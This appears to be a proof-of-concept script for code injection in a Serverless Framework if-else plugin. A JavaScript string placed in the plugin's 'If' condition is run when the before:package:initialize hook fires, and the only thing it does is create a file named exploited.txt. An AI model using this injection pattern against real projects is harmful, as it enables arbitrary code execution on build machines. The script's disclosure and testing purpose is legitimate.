'use strict'

const pkg = require('../src');

const exploitStr = "const fs = require('node:fs'); let fd = fs.openSync('exploited.txt', 'a'); true;";
const serverless = {
    service: {
        custom: {
            serverlessIfElse: [ { If: exploitStr } ]
        }
    }
};

const instance = new pkg(serverless, {});
const boundFn = instance.hooks["before:package:initialize"];
boundFn();